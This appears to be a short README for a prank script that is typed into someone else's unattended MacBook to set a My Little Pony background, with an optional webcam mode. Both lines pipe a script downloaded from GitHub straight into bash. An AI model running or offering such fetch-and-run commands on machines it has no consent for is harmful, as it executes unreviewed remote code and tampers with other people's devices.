Don't let me touch your Macbook, or I'll type in:
```
curl -S https://raw.githubusercontent.com/jeversmann/pwny/master/pwn.sh | bash
```

## Modes
If the My Little Pony background isn't enough, there are some flags to try:
```
curl -S https://raw.githubusercontent.com/jeversmann/pwny/master/pwn.sh | bash -s -- --webcam
```
